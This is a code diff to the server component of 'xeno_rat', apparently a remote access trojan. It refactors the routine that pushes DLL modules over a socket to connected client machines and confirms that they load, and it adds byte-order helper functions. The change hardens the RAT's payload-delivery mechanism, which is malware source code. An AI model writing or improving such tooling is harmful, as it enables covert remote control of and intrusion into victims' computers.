@@ -97,55 +97,71 @@ namespace xeno_rat_server
         /// <param name="Logcallback">An optional callback function for logging messages.</param>
         /// <returns>A boolean value indicating whether the DLL was loaded successfully.</returns>
         /// <exception cref="Exception">Thrown when an error occurs during the DLL loading process.</exception>
-        public static async Task<bool> LoadDllAsync(Node clientsubsock, string dllname, byte[] dll, Action<string, Color> Logcallback=null)
+        public static async Task<bool> LoadDllAsync(Node clientsubsock, string dllname, byte[] dll, Action<string, Color> Logcallback = null)
         {
-            clientsubsock.SetRecvTimeout(20000);
-            if (Logcallback != null)
+            try
             {
-                Logcallback($"Loading {dllname} dll...", Color.Blue);
-            }
-            if (clientsubsock.SockType != 2)
-            {
+                clientsubsock.SetRecvTimeout(20000); // 20s timeout
+
                 if (Logcallback != null)
+                    Logcallback($"Loading {dllname} DLL...", Color.Blue);
+
+                if (clientsubsock.SockType != 2)
                 {
-                    Logcallback($"Loading {dllname} dll failed!", Color.Red);
+                    Logcallback?.Invoke($"Loading {dllname} DLL failed!", Color.Red);
+                    return false;
                 }
+
+                // Step 1: Request DLL load
+                byte[] loadRequest = new byte[] { 1 };
+                await clientsubsock.SendAsync(loadRequest);
+
+                // Step 2: Send DLL name using SocketHandler (length + compression + encryption handled)
+                byte[] nameBytes = Encoding.UTF8.GetBytes(dllname);
+                await clientsubsock.SendAsync(nameBytes);
+
+                // Step 3: Receive server response
+                byte[] dllinfo = await clientsubsock.ReceiveAsync();
+                if (dllinfo == null)
+                {
+                    Logcallback?.Invoke($"No response from server while loading {dllname}!", Color.Red);
+                    return false;
+                }
+
+                if (dllinfo[0] == 1)
+                {
+                    // Server requested DLL bytes, send them
+                    await clientsubsock.SendAsync(dll);
+                }
+                else if (dllinfo[0] == 2)
+                {
+                    Logcallback?.Invoke($"Server refused to load {dllname} DLL!", Color.Red);
+                    return false;
+                }
+
+                // Step 4: Wait for final confirmation
+                byte[] finalResponse = await clientsubsock.ReceiveAsync();
+                if (finalResponse == null || finalResponse[0] != 3)
+                {
+                    // Server sent failure message
+                    byte[] errorMsg = await clientsubsock.ReceiveAsync();
+                    string msg = errorMsg != null ? Encoding.UTF8.GetString(errorMsg) : "Unknown error";
+                    Logcallback?.Invoke($"Starting {dllname} DLL failed!", Color.Red);
+                    Logcallback?.Invoke(msg, Color.Red);
+                    return false;
+                }
+
+                clientsubsock.ResetRecvTimeout();
+                Logcallback?.Invoke($"{dllname} DLL loaded successfully!", Color.Green);
+                return true;
+            }
+            catch (Exception ex)
+            {
+                Logcallback?.Invoke($"Exception loading {dllname} DLL: {ex.Message}", Color.Red);
                 return false;
             }
-            byte[] loadll = new byte[] { 1 };
-            await clientsubsock.SendAsync(loadll);
-            await clientsubsock.SendAsync(Encoding.UTF8.GetBytes(dllname));
-            byte[] dllinfo = await clientsubsock.ReceiveAsync();
-            if (dllinfo[0] == 1)
-            {
-                await clientsubsock.SendAsync(dll);
-            }
-            else if (dllinfo[0] == 2)
-            {
-                if (Logcallback != null) 
-                {
-                    Logcallback($"Loading {dllname} dll failed!", Color.Red);
-                }
-                return false;
-            }
-            byte[] dllloadinfo = await clientsubsock.ReceiveAsync();
-            if (dllloadinfo[0] != 3)
-            {
-                byte[] errorMessage = await clientsubsock.ReceiveAsync();
-                if (Logcallback != null)
-                {
-                    Logcallback($"Starting {dllname} dll failed !", Color.Red);
-                    Logcallback(Encoding.UTF8.GetString(errorMessage), Color.Red);
-                }
-                return false;
-            }
-            clientsubsock.ResetRecvTimeout();
-            if (Logcallback != null)
-            {
-                Logcallback($"{dllname} dll loaded!", Color.Green);
-            }
-            return true;
         }
+
 
         /// <summary>
         /// Computes the SHA-256 hash value for the input string and returns the result as an array of bytes.
@@ -260,6 +276,23 @@ namespace xeno_rat_server
                 return null;
             }
             return conn;
+        }
+    }
+    public static class NetworkUtils
+    {
+        public static byte[] IntToBytes(int value)
+        {
+            byte[] bytes = BitConverter.GetBytes(value);
+            if (BitConverter.IsLittleEndian)
+                Array.Reverse(bytes); // convert to network byte order
+            return bytes;
+        }
+
+        public static int BytesToInt(byte[] bytes)
+        {
+            if (BitConverter.IsLittleEndian)
+                Array.Reverse(bytes);
+            return BitConverter.ToInt32(bytes, 0);
         }
     }
 }
